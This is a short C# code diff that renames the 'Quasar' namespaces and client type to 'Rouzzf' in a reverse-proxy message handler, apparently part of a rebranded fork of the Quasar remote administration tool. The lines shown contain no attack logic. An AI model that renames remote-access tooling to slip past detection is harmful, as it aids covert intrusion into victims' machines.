@@ -1,16 +1,16 @@
-﻿using Quasar.Client.Networking;
-using Quasar.Client.ReverseProxy;
-using Quasar.Common.Messages;
-using Quasar.Common.Messages.ReverseProxy;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.Networking;
+using Rouzzf.Client.ReverseProxy;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Messages.ReverseProxy;
+using Rouzzf.Common.Networking;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class ReverseProxyHandler : IMessageProcessor
     {
-        private readonly QuasarClient _client;
+        private readonly RouzzfClient _client;
 
-        public ReverseProxyHandler(QuasarClient client)
+        public ReverseProxyHandler(RouzzfClient client)
         {
             _client = client;
         }
